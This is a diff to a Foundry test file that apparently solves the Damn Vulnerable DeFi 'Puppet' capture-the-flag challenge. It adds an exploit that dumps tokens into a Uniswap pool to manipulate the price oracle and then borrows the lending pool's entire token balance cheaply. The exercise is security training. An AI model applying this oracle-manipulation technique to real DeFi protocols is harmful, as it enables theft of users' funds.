@@ -96,10 +96,17 @@ contract Puppet is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitV1() public {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        uniswapExchange.tokenToEthSwapInput(999e18, 1e18, DEADLINE);
+
+        puppetPool.borrow{value: 20 ether}(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
+        console.log(" amount is ", puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE));
 
         /**
          * EXPLOIT END *
